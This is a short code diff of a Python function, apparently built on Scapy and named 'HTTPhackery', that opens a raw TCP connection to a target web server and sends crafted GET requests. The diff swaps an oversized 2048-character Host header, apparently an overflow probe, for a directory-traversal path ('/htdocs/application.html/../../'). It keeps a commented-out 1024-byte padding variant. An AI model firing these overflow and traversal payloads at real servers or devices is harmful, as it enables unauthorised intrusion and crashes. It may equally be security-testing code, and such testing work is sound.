@@ -79,7 +79,8 @@ def HTTPhackery(src, dst, dport):
 
     #ack
     ACK=TCP(sport=sport, dport=dport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
-    getStr = 'GET '+ '/general_hardware_information.html HTTP/1.1\r\n'+'Host: '+ dst +'X'*2048+"\r\n\r\n"
-    #print(getStr)
+    #getStr = 'GET '+ '/htdocs/application.html HTTP/1.1\r\n'+"X"*1024+'Host: '+ dst +"\r\n\r\n"
+    getStr = 'GET '+ '/htdocs/application.html/../../ HTTP/1.1\r\n'+'Host: '+ dst +"\r\n\r\n"
+    print("HTTP request sent:", getStr)
     reply = sr1(ip/ACK/getStr)
     print(reply)
